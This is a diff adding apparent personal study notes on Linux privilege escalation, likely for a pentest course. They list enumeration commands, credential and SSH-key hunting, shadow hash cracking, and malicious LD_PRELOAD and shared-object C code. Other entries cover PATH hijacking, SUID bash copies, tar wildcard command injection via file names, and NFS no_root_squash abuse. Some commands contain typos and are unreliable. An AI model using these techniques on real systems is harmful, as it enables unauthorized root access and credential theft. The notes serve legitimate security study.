@@ -1,0 +1,232 @@
+Linux Privesc:
+=============
+Baiscs: see linux important commands
+different types of shell in linux:
+	/bin/sh:
+		terminal>#
+		/bin/sh is an executable representing the system shell and usually implemented as a symbolic link pointing to the executable for whichever shell is the system shell. The system shell is basically the default shell that the script should use. In last couple of years, Debian (and Ubuntu) decided to switch the system shell from bash to dash — a similar shell but lighter and much faster.
+	/bin/bash:
+		user@host:/dir$
+		/bin/bash is the most common shell used as default shell for user login of the linux system. The shell’s name is an acronym for Bourne-again shell.
+	dash:
+		Dash is fairly well compatible with bash, being based on the same POSIX standard.
+	rbash:
+		Restricted Bash
+	bash:
+	Note:
+		While going from lower shell to higher shell (user to root)
+		if ssh doesnt work:
+			lower_shell> su root
+Basic enumeration:
+	sytem enum:
+		uname -a
+		cat /proc/version => same as uname
+		lscpu => tell arch
+		ps -aux => process
+		sudo -v => tells sudo version
+	user enum:
+		cat /etc/passwd => see all users
+			anyone can access this file
+		history
+			always see history, we may find some juicy info
+		cat .bash_history
+	network enum:
+		ip a => same as ifconfig
+		ip route => routing table
+		ip neigh => arp table
+		netstat -ano => show which ports are open
+Automated Tools:
+	linpeas.sh => better as it has colors
+	linenum.sh => same as linpeas.sh
+	linux-exploit-suggester.sh => CVE's
+	linuxprivchecker.py => CVE's
+	running any script in linux:
+		chmod +x script.ext
+		./script.ext
+Kernel Exploitation:
+	github.com/lucyoa/kernel-exploits
+	famous:
+		dirtycow
+	converting code from .c to obj:
+		gcc -pthread cow.c -o cow	
+Passwords and file permissions:
+	Password hunting:
+		grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+			it will look for "PASSWORD=" in all files
+		find / -type f -iname "PASS*" 2> /dev/null
+		for ssh keys:
+			find / -type f -name id_rsa 2> /dev/null
+			find / -type f -name authorized_keys 2> /dev/null
+	Shadow password cracking:
+		basics:
+			/etc/passwd:
+				it contains no password
+				anyone can read it
+				it tells us what users are on a machine
+			/etc/passwd:
+				contains password in form of SHA-512 hash
+			relation between the two:
+				passwd: root:x:-----------
+				shadow: root:hash
+				now, the 'x' is a placeholder the hash of root
+		unshadow passwd shadow
+			passwd => /etc/passwd
+			shadow => /etc/shadow
+			it gives a SHA-512 file containg hash which can be cracked later on using hashcat or john
+			hashcat -m 1800 hash rockyou.txt
+	if we have RW access to shadow:
+		we can remove 'x' from passwd file, and root becomes passwordless
+		exchange hash from shadow file to a hash which we know => password changed
+		change id to 0 of our user => we become root
+sudo -l:
+	it shows which files/binaries can be run on behalf of Super Users(like root) without providing password
+	/etc/sudoers file:
+		it contains the text which sudo -l shows
+	to run sudo on behalf of any user other than root:
+		sudo -u toor command
+	sudo shell escape:
+		most of the files shown are binaries
+		whenever we see binaries => gtfobins.github.io
+	escalation via intended functionality:
+		sometimes, we may not have exploitation path for binaries shown according to gtfobins.
+		But, we may have some functionality of binaries, which can be exploited
+		google => file_name sudo privilege escalation
+	escaltion via LD_PRELOAD:
+		LD => Dynamic Linker
+		PreLoading => its a property of LD, it means we can load our own library before loading anything else.
+		detection:
+			sudo -l
+				env_keep+=LD_PRELOAD
+				NOPASSWD apache2 (or any binary)
+		Exploitation:
+			making malc library(.so file): 
+				shell.c:
+					#include <stdio.h>
+					#include <sys/types.h>
+					#include <stdlib.h>
+					void _init(){
+						unsetenv("LD_PRELOAD");
+						setgid(0);
+						setuid(0);
+						system("/bin/bash");
+					}
+					explanation:
+						unsetenv("LD_PRELOAD") => unset env variable "LD_PRELOAD"
+						setgid(0) => gid of root is 0
+						setuid(0) => uid of root is 0
+						system("/bin/bash") => excute /bin/bash
+				gcc -fpic -shared -o shell.so shell.c -nostartfile
+					fpic => Position Independent Code
+						it means regardless of from where shell addressing is, its going to function
+			sudo LD_PRELOAD=/home/user/shell.so apache2
+	CVE-2019-14287:
+		we can bypass restriction of using "sudo /bin/bash" by using "sudo -u#-1 /bin/bash"
+		requirements:
+			/etc/sudoers.tmp or sudo -l should have this line:
+				username ALL=(ALL, !root)
+	CVE-2019-18634:
+		requirements:
+			sudo version < 1.8.26
+			pwnfeedback should be enabled, how to check it:
+				sudo -l 
+				cat /etc/sudoers
+				sudo su root
+					type anything afterwars, it will be written as *****
+		exploitation:
+			github -> saleemrahid -> CVE-2019-18634
+SUID:(Set owner User ID upon execution):
+	find / -type f -perm -u=s 2> /dev/null
+	SUID privesc via Shared Object Injection:(SO Injection)
+		Basics:
+			A Shared Object(.so) file is a library file which is linked to the executable/binary during runtime
+			Here, we inject into a .so file to exploit the executable/binary which may help escalate our privileges, provided that the executable/binary is a SUID file.
+		Exploitation:
+			malc.c:
+				#include<stdio.h>
+				#include<stdlib.h>
+				static void inject() __attribute__((constructor));
+				void inject(){
+					system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash -p");
+				}
+			gcc -shared -gpic -o malc.so malc.c
+			now, we place malc.so at a place from where the vulnerable binary can access it
+		Note:
+			TCM has a video on it in linux privesc course.
+	SUID privesc via Binary SYMLINKS:(CVE-2016-1247)
+		this is a vuln for nginx HTTP proxy webserver
+		vuln:
+			persmission of logs generated by nginx
+		SYMLINK:(Symobolic Link)
+			a file that contains reference to another files/dir in form of relative/absolute path
+		exploit -> github
+	SUID privesc via environment variables:
+		lets say we have a SUID file, but we cant exploit it.
+		So, we analyse it using grep and We may find that the file is calling other files/binaries
+		when some file is called from a file, it has either absolute path or relative path.
+			absolute path => /tmp/hello.so 
+			relative path => hello.so
+				in this case "environment variables come in play"
+		Via Absolute Path:
+			In such case, we make a malicious function with same name
+			exploitation:	
+				function /di1/dir2/service_name() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
+					explanation:
+						function => make a function
+						copies /bin/bash to /tmp/bash and makes /tmp/bash a SUID and then executes /tmp/bash
+				export -f /dir1/dir2/service
+				now run the SUID and boom
+		Via relative PATH:
+			Lets say we saw inside a SUID file "service apache2 start". Service is a binary file. its relative path is given. So we can exploit the 'Service' file
+			exploitation:
+				echo 'int main(){setgid(0);setuid(0);system("/bin/bash");return 0;}' > /tmp/service.c
+					explanation:
+						setgid(0) => gid of root is 0
+						setuid(0) => uid of root is 0
+						system("/bin/bash") => excute /bin/bash
+				gcc /tmp/service.c -o service
+				explort PATH=/tmp:$PATH
+				run the suid file and we are now root
+Capabilities:
+Schdeuled Tasks:
+	Two types:
+		cron jobs:
+			cat /etc/crontab => record of every cron job
+				if we see all **** => job is running every minute
+		systemd timers:
+			systemctl list-timers --all
+	escalation via cron file overwrite:
+		we see a file in /etc/crontab which can be modified by us (ie RW) permission, then we can modify that file to gain ROOT
+	escalation via cronpaths:
+		understanding cronpath:
+			PATH=/home/user:/sbin/local/:------
+			to run a file, it will 1st look in /home/user then in /sbin/local
+		if we find a file running every minute by root, we can modify it looking at our path
+Wildcards in TAR:
+	suppose we found a file which is either cron/SUID/etc and it has a statement like:
+		tar czf /usr/------/x.ext * (only wildcard amtters)
+	exploitation:
+		echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
+		touch /home/user/--checkpoint=1 (provide full path)
+		touch /home/user/--checkpoint-action=exec=sh\runme.sh
+		/tmp/bash -p => we are root now
+NFS Root Squashing:
+	NFS => netwrok file shares
+	cat /etc/exports
+		if we see a line like this:
+			/dir*(----,no_root_squash)
+		it means that /dir is shareable and can be mounted. it also means any changes made to it while being mounted are done as ROOT
+	kali:
+		showmount -e <ip> => it will show shares offered by an ip
+		mkdir /tmp/mount
+		mount -o rw,vers=2 <ip>:/dir /tmp/mount
+		now we can some changes in it, to exploit it	
+File transfers:
+	upload:
+		python3 -m http.server 80
+		python3 -m http.server 80 --dir /home/kali/tools
+		python2 -m SimpleHTTPServer 80
+			note: python2 support is discontinued in kali 2020.1
+	Download:
+		wget
+		axel
+		curl
